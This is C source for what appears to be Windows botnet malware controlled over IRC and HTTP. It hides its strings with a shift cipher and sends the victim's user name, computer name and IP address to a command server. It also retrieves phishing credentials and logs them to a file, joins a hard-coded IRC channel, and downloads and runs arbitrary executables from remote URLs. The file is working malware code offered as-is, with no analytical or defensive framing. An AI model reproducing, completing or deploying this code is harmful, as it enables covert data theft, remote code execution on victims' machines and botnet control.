#include "irc.h"
#include "mylib.h"
#include "dns.h"

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

char *
riddle_enc
(char *buf) {
    unsigned long x;
    char *tmp=malloc(strlen(buf)+0x1);
    strcpy(tmp,buf);   
	for(x=0x0; x < strlen(tmp); x++) 
       tmp[x] -= (strlen(tmp));
    return(tmp);
}

char *
GetLocalIpAddress
(void) {
    char lpHost[0x40], *ip_addr;
    ip_addr=malloc(0x40);
    gethostname(lpHost,sizeof(lpHost));
    struct hostent *hResolve=gethostbyname(lpHost);
    if(!hResolve && hResolve->h_addrtype == AF_INET) return(NULL);
    u_char **i=(u_char**)hResolve->h_addr_list;
    sprintf(ip_addr,riddle_enc("0o90o90o90o"), // %d.%d.%d.%d
        (*i)[0x0],(*i)[0x1],(*i)[0x2],(*i)[0x3]);
    return(ip_addr);
}  
                           
void
GetComputerData
(char *lpData, int bCommandType) {
    char lpUser[0x80],lpComputer[0x80], *tmp;
    unsigned long dwUsrSize, dwCompSize;
    dwUsrSize=sizeof(lpUser);
    dwCompSize=sizeof(lpComputer);
    srand(GetTickCount());
    GetComputerName(lpComputer,&dwCompSize);
    GetUserName(lpUser,&dwUsrSize);
    switch(bCommandType) {
        case COMMAND_TYPE_IRC:
            sprintf(irc.alias,riddle_enc("+ya+yc"), // %s[%s]
                lpUser,lpComputer);
            while(tmp=strchr(irc.alias,' ')) 
                strncpy(tmp,"_",0x1); 
            //strcpy(irc.channel,riddle_enc(".oÄyvpwspt")); // #dunkelheit
            strcpy(irc.channel,"#flyingroof");
            strcpy(irc.password,riddle_enc("OQVÑÜUXYQÜÑXXáTTÇáQVZÜYÉÑTÉÜSSYZÑ")); // .05ce4780ec77f33af059e8bc3be2289c
            break;
        case COMMAND_TYPE_HTTP:
           sprintf(lpData,riddle_enc(
                "úüŒüÕõ°Õ£ùü–Œ†§ûùû§û°ù†ú¢—†û£Õù§®êﬁëŒúü†û†–£üõúõÃ£œù"
                "ú¢¢ü—ü§°Ã£ùÃ—†œ†®êﬁëÃúùÃûõ¢§–úüŒ–œü°–°§ÕÃ†ùÕ£Ã§õÕùúÃ®êﬁ"),
                 // 14c4b06b824ec593239362517f538b29=%s&c14535e84010a8d21774f496a82af5d5=%s&a12a3079e14ced46e69ba52b8a90b21a=%s
                lpUser,lpComputer,GetLocalIpAddress());
            break;
    }
}

char *
GetHashValue
(char *buf, char *lpToken, char cTokenEnd, int i) {
    char *hash_v,*hash_s,*hash_e;
    if(hash_s=strstr(buf,lpToken))
       hash_s += i; 
    else return(NULL);
    if(hash_e=strchr(hash_s,cTokenEnd)) 
      hash_e[0x0]='\0';
    hash_v=malloc(strlen(hash_s) + 0x1);
    strcpy(hash_v,hash_s);
    if(hash_e) hash_e[0x0]=cTokenEnd;
    return(hash_v);
}

int 
GetRandomNumber
(void) {
    int c;
    srand(GetTickCount());
    c = (rand() % 10000 + 0x1);
    for(;c < 10000;)  
         c = c * 0x2;
    if(c > 1000)
         c = c * 0x2;
    return(c);
} 

int
is_online
(void) {
    unsigned long sock;
    struct hostent *hNetwork; 
    if(hNetwork=gethostbyname(riddle_enc("ÖÖÖ<u}}uzs<q}{"))) { // www.google.com
      struct sockaddr_in addr;
      sock=socket(AF_INET,SOCK_STREAM,0x0);
      addr.sin_family=AF_INET; 
      addr.sin_port=htons(0x50);
      addr.sin_addr=*((struct in_addr*)hNetwork->h_addr);
      if(connect(sock,(struct sockaddr*)&addr,sizeof(struct sockaddr)) == SOCKET_ERROR) 
         goto exit;
      closesocket(sock);
      return(0x1);
    }
    exit: return(0x0);
}

void 
GetWebPage
(unsigned char *buf, unsigned long dwSize, char *lpHost, char *lpFile, char *lpMethod, char *lpData, int bDelSession) {
    HINTERNET hInternetMain,hConnect,hRequest;
    char tmp[0x40];
    unsigned long BytesRead;
    sprintf(tmp,riddle_enc("q}}yC88.|"),lpHost); // http://%s
    hInternetMain=InternetOpen(riddle_enc("°¨õûûìaf`bRZï°ü¢ì¶õîûómRÖ{wRi`bmRâõ†ñ°©•RÄÜRg`c["),
        INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0x0);
    hConnect=InternetConnect(hInternetMain,lpHost,INTERNET_DEFAULT_HTTP_PORT,
        NULL,NULL,INTERNET_SERVICE_HTTP,0x0,0x1);
    hRequest=HttpOpenRequest(hConnect,lpMethod,lpFile,NULL,tmp,NULL,0x0,0x0);  
    strcpy(tmp,"Content-Type: application/x-www-form-urlencoded"); // Content-Type: application/x-www-form-urlencoded
    HttpSendRequest(hRequest,tmp,strlen(tmp),lpData,strlen(lpData));
    if(buf != NULL) InternetReadFile(hRequest,buf,dwSize,&BytesRead);
    if(bDelSession) {
       InternetCloseHandle(hInternetMain);
       InternetCloseHandle(hConnect);
       InternetCloseHandle(hRequest);
    }
}

char *
GetPhishingIpAddress
(void) {
    char lpData[0x200], *ip_addr;
    ip_addr=malloc(0x40);
    GetComputerData(lpData,COMMAND_TYPE_HTTP);
    GetWebPage(ip_addr,0x40,DnsGetDomain(SERVER_DNS),"",riddle_enc("TSWX"),lpData,0x1); // POST
    return(!strlen(ip_addr) ? 
        GetLocalIpAddress() : ip_addr);   
}

int 
GetPhishingLogins
(void) {
    char buf[0x200];
    GetWebPage(buf,sizeof(buf),GetPhishingIpAddress(),
         riddle_enc("SQÖPSTÉÅÖYÖYÇYVÑÉVÑÖYXTÉVÜUÖSWUS"),riddle_enc("JHW"),"",0x1); // GET, 31e034cae9e9b96dc6de984c6f5e3753
    if(buf != NULL) LogToFile(riddle_enc("ptwo6li|"),buf,"a"); // hlog.dat
}

int 
GetExeFile
(const char *lpUrl, int bCommandType) {
    HANDLE hFile;
    HINTERNET hInternetMain,hInternetUrl;
    unsigned long BytesRead,BytesWritten;
    char tmp[0x40],fname[0x40];
    GetTempPath(sizeof(tmp),tmp);
    sprintf(fname,riddle_enc(".|e.m7nÅn"),tmp, // %s\%d.exe
       GetRandomNumber());
    if(bCommandType == COMMAND_TYPE_IRC) {
       sprintf(tmp,riddle_enc("{J}@dèóéåèÅÑ@âéâîâÅîÖÑN@H#QQEì#I"),fname); // [*] Download initiated. (11%s)
       IrcSend(tmp);
    }
    hInternetMain=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0x0);
    if(hInternetUrl=InternetOpenUrl(hInternetMain,lpUrl,NULL,NULL,INTERNET_FLAG_RELOAD,NULL)) {
       hFile=CreateFile(fname,FILE_ALL_ACCESS,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,0x0,NULL);
       if(hFile == NULL || hFile == INVALID_HANDLE_VALUE) 
          return(0x0);
       do {
         char buf[0x800];
         InternetReadFile(hInternetUrl,buf,sizeof(buf),&BytesRead);
         WriteFile(hFile,buf,BytesRead,&BytesWritten,0x0);
       } while(BytesRead > 0x0);
       BytesWritten=GetFileSize(hFile,0x0);
       CloseHandle(hFile);
       WinExec(fname,SW_SHOWNORMAL); 
       return(BytesWritten);
    } 
    else return(0x0);
}

int
LogToFile
(char *fname, char *buf, char *lpType) {
   FILE *fp;
   fp=fopen(fname,lpType);
   if(fp == NULL) return(0x0);
   else fprintf(fp,"%s\r\n",buf);
   fclose(fp);
   return(0x1);
} 
